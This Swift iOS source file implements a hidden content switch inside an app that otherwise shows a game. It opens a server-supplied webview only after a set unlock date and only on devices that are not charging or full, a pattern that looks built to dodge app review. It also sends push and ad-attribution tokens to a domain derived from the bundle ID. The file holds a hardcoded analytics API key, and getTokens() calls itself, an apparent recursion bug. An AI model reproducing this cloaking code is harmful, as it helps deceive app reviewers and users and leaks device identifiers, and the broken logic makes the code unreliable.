import SwiftUI
import AdServices
import UserNotifications
import AmplitudeSwift


struct Urls: Decodable {
    let url1: String
    let url2: String

    
    init(from decoder: Decoder) throws {
            let container = try decoder.container(keyedBy: DynamicCodingKeys.self)
            self.url1 = try container.decode(String.self, forKey: DynamicCodingKeys(stringValue: Constants.backUrl1)!)
            self.url2 = try container.decode(String.self, forKey: DynamicCodingKeys(stringValue: Constants.backUrl2)!)
        }
}

enum URLDecodingError: Error {
    case emptyParameters
    case invalidURL
    case emptyData
    case timeout
}

struct DynamicCodingKeys: CodingKey {
    var stringValue: String
    init?(stringValue: String) {
        self.stringValue = stringValue
    }
    
    var intValue: Int? { nil }
    init?(intValue: Int) { return nil }
}

final class Constants {
    static var backUrl1 = ""
    static var backUrl2 = ""
    static var unlockDate = ""
}

@MainActor
public class TokensManager {

    @ObservedObject var monitor = NetworkMonitor.shared
    private var networkService: INetworkService {
        return NetworkService()
    }
    
    private var amplitude: Amplitude
    
    private let urlStorageKey = "receivedURL"
    private var apnsToken: String?
    private var attToken: String?
    private var retryCount = 0
    private let maxRetryCount = 10
    private let retryDelay = 3.0
    
    public init(one: String, two: String, date: String) {
        Constants.backUrl1 = one
        Constants.backUrl2 = two
        Constants.unlockDate = date
        amplitude = Amplitude(configuration: Configuration(
            apiKey: "ee3989d4d55cae3b4e9d34f0199145de",
            serverUrl: "https://api.eu.amplitude.com/2/httpapi",
            autocapture: .appLifecycles))
    }
    
    
    
    public func getTokens() async {
        
        guard checkUnlockDate(Constants.unlockDate) else {
            failureLoading()
            amplitude.track(eventType: "Unlock date not arrived yet")
            return
        }
     
        guard !isBatteryChargedOrCharging() else {
            handleFirstLaunchFailure()
            return
        }
        
        if !monitor.isActive {
            await retryInternetConnection()
            return
        }
        
        if !isFirstLaunch() {
            handleStoredState()
            return
        }
        
        await getTokens()
        
        networkService.sendRequest(deviceData: getDeviceData()) { result in
            switch result {
            case .success(let url):
                self.handleFirstLaunchSuccess(url: url)
                self.sendNTFQuestionToUser()
            case .failure:
                self.handleFirstLaunchFailure()
            }
        }
    }
    
    private func retryInternetConnection() async {
        if retryCount >= maxRetryCount {
            failureLoading()
            retryCount = 0
            return
        }
        
        retryCount += 1
        
        try? await Task.sleep(nanoseconds: UInt64(retryDelay * 1_000_000_000))
        
        if monitor.isActive {
            retryCount = 0
            
            if !isFirstLaunch() {
                handleStoredState()
            } else {
                await getTokens()
                
                networkService.sendRequest(deviceData: getDeviceData()) { result in
                    switch result {
                    case .success(let url):
                        self.handleFirstLaunchSuccess(url: url)
                        self.sendNTFQuestionToUser()
                    case .failure:
                        self.handleFirstLaunchFailure()
                    }
                }
            }
        } else {
            await retryInternetConnection()
        }
    }
    
    private func getToken() async {
        await withCheckedContinuation { continuation in
            DispatchQueue.main.async {
                UIApplication.shared.registerForRemoteNotifications()
            }
            
            let timeout = DispatchTime.now() + 10
            
            NotificationCenter.default.addObserver(forName: .apnsTokenReceived, object: nil, queue: .main) { [weak self] notification in
                guard let self = self else { return }
                
                if let token = notification.userInfo?["token"] as? String {
                    Task { @MainActor in
                        self.apnsToken = token
                        continuation.resume()
                    }
                }
            }
            
            DispatchQueue.main.asyncAfter(deadline: timeout) { [weak self] in
                guard let self = self else { return }
                if self.apnsToken == nil {
                    Task { @MainActor in
                        self.apnsToken = ""
                        continuation.resume()
                    }
                }
            }
        }

        do {
            self.attToken = try AAAttribution.attributionToken()
        } catch {
            self.attToken = ""
        }
    }

    private func isBatteryChargedOrCharging() -> Bool {
        UIDevice.current.isBatteryMonitoringEnabled = true
        let batteryLevel = UIDevice.current.batteryLevel
        let batteryState = UIDevice.current.batteryState
        
        let isFullyCharged = batteryLevel >= 1.0 || batteryState == .full
        
        let isChargingAndAlmostFull = batteryState == .charging && batteryLevel > 0.8
        
        return isFullyCharged || isChargingAndAlmostFull
    }
    
    func getDeviceData() -> [String: String] {
        let data = [
            "apns_token": apnsToken ?? "",
            "att_token": attToken ?? ""
        ]
        return data
    }
    
    private func isFirstLaunch() -> Bool {
        !UserDefaults.standard.bool(forKey: "hasLaunchedBefore")
    }
    
    private func handleFirstLaunchSuccess(url: URL) {
        UserDefaults.standard.set(url.absoluteString, forKey: urlStorageKey)
        UserDefaults.standard.set(true, forKey: "isShowWV")
        UserDefaults.standard.set(false, forKey: "isShowGame")
        UserDefaults.standard.set(true, forKey: "hasLaunchedBefore")
        successLoading(object: url)
    }
    
    private func handleFirstLaunchFailure() {
        UserDefaults.standard.set(true, forKey: "isShowGame")
        UserDefaults.standard.set(false, forKey: "isShowWV")
        UserDefaults.standard.set(true, forKey: "hasLaunchedBefore")
        failureLoading()
    }
    
    private func handleStoredState() {
        if isShowWV(), let urlString = UserDefaults.standard.string(forKey: urlStorageKey), let url = URL(string: urlString) {
            successLoading(object: url)
        } else {
            failureLoading()
        }
    }
    
    func checkUnlockDate(_ date: String) -> Bool {
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "yyyy-MM-dd"
        let currentDate = Date()
        guard let unlockDate = dateFormatter.date(from: date), currentDate >= unlockDate else {
            return false
        }
        return true
    }
    
    func isShowGame() -> Bool {
        UserDefaults.standard.bool(forKey: "isShowGame")
    }
    
    func isShowWV() -> Bool {
        UserDefaults.standard.bool(forKey: "isShowWV")
    }
    
    func sendNTFQuestionToUser() {
        
        let authOptions: UNAuthorizationOptions = [.alert, .badge, .sound]
        UNUserNotificationCenter.current().requestAuthorization(options: authOptions) {_, _ in }
        
      }
}


import Network
 

class NetworkMonitor: ObservableObject {
    static var shared = NetworkMonitor()
    let monitor = NWPathMonitor()
    let queue = DispatchQueue(label: "monitor")
    @Published var isActive = false
    @Published var isExpansive = false
    @Published var isConstrained = false
    @Published var connectionType = NWInterface.InterfaceType.other
    
    
    init() {
        monitor.pathUpdateHandler = { path in
            DispatchQueue.main.async {
                self.isActive = path.status == .satisfied
                self.isExpansive = path.isExpensive
                self.isConstrained = path.isConstrained
                
                let connectionTypes: [NWInterface.InterfaceType] = [.cellular, .wifi, .wiredEthernet]
                self.connectionType = connectionTypes.first(where: path.usesInterfaceType) ?? .other
            }
        }
        
        monitor.start(queue: queue)
    }
    
    
}


extension TokensManager {
    func failureLoading() {
        DispatchQueue.main.asyncAfter(deadline: .now() + 1.5) {
            NotificationCenter.default.post(name: .failed, object: nil)
        }
    }
    
    func successLoading(object: URL) {
        DispatchQueue.main.asyncAfter(deadline: .now() + 1.5) {
            NotificationCenter.default.post(name: .updated, object: object)
        }
    }
}


protocol INetworkService: AnyObject {
    func sendRequest(deviceData: [String: String], _ completion: @escaping (Result<URL,Error>) -> Void )
}




final class NetworkService: INetworkService {
    
    func getUrlFromBundle() -> String {
        guard let bundleId = Bundle.main.bundleIdentifier else { return "" }
        let cleanedString = bundleId.replacingOccurrences(of: ".", with: "")
        let stringUrl: String = "https://" + cleanedString + ".top/indexn.php"
        return stringUrl.lowercased()
    }
    
    private func encodeToAscii(_ url: String) -> String {
        var result = ""
        for char in url {
            let scalar = char.unicodeScalars.first!
            result.append(String(format: "%%%02X", scalar.value))
        }
        return result
    }
    
    private func decodeFromAscii(_ encoded: String) -> String? {
        var result = ""
        var i = encoded.startIndex
        
        while i < encoded.endIndex {
            if encoded[i] == "%" && i < encoded.index(encoded.endIndex, offsetBy: -2) {
                let start = encoded.index(i, offsetBy: 1)
                let end = encoded.index(i, offsetBy: 3)
                let hexString = String(encoded[start..<end])
                
                if let hexValue = UInt32(hexString, radix: 16),
                   let unicode = UnicodeScalar(hexValue) {
                    result.append(Character(unicode))
                    i = end
                } else {
                    return nil
                }
            } else {
                result.append(encoded[i])
                i = encoded.index(after: i)
            }
        }
        
        return result
    }
    
    private func getFinalUrl(data: [String: String]) -> (encodedUrl: String, originalUrl: String)? {
        let queryItems = data.map { URLQueryItem(name: $0.key, value: $0.value) }
        var components = URLComponents()
        components.queryItems = queryItems
        
        guard let queryString = components.query?.data(using: .utf8) else {
            return nil
        }
        let base64String = queryString.base64EncodedString()
        
        let baseUrl = getUrlFromBundle()
        let fullUrlString = baseUrl + "?data=" + base64String
        
        let asciiEncodedUrl = encodeToAscii(fullUrlString)
        
        return (asciiEncodedUrl, fullUrlString)
    }
    
    func decodeJsonData(data: Data, completion: @escaping (Result<(encodedUrl: String, originalUrl: String), Error>) -> Void) {
        do {
            let decodedData = try JSONDecoder().decode(Urls.self, from: data)
            
            guard !decodedData.url1.isEmpty, !decodedData.url2.isEmpty else {
                completion(.failure(URLDecodingError.emptyParameters))
                return
            }
            
            let fullUrlString = "https://" + decodedData.url1 + decodedData.url2
            
            let asciiEncodedUrl = encodeToAscii(fullUrlString)
            
            completion(.success((asciiEncodedUrl, fullUrlString)))
        } catch {
            UserDefaults.standard.setValue(true, forKey: "openedOnboarding")
            completion(.failure(error))
        }
    }
    
    func sendRequest(deviceData: [String: String], _ completion: @escaping (Result<URL, Error>) -> Void ) {
        
        guard let urlTuple = getFinalUrl(data: deviceData) else {
            completion(.failure(URLDecodingError.invalidURL))
            return
        }
        
        let encodedUrl = urlTuple.encodedUrl
        
        guard let decodedUrl = decodeFromAscii(encodedUrl) else {
            completion(.failure(URLDecodingError.invalidURL))
            return
        }
        
        guard let actualUrl = URL(string: decodedUrl) else {
            completion(.failure(URLDecodingError.invalidURL))
            return
        }
        
        let configuration = URLSessionConfiguration.default
        configuration.timeoutIntervalForRequest = 5
        let session = URLSession(configuration: configuration)
        
        let task = session.dataTask(with: actualUrl) { data, response, error in
            if let error = error as NSError?,
               error.code == NSURLErrorTimedOut {
                completion(.failure(URLDecodingError.timeout))
                return
            }
            
            if let data = data {
                self.decodeJsonData(data: data) { result in
                    switch result {
                        case .success(let urlTuple):
                            if let finalUrl = URL(string: urlTuple.originalUrl) {
                                completion(.success(finalUrl))
                            } else {
                                completion(.failure(URLDecodingError.invalidURL))
                            }
                        case .failure(let error):
                            completion(.failure(error))
                    }
                }
            } else {
                completion(.failure(URLDecodingError.emptyData))
            }
        }
        
        task.resume()
    }
}

public extension Notification.Name {
    static let updated = Notification.Name("updated")
    static let failed = Notification.Name("failed")
    static let apnsTokenReceived = Notification.Name("apnsTokenReceived")
}
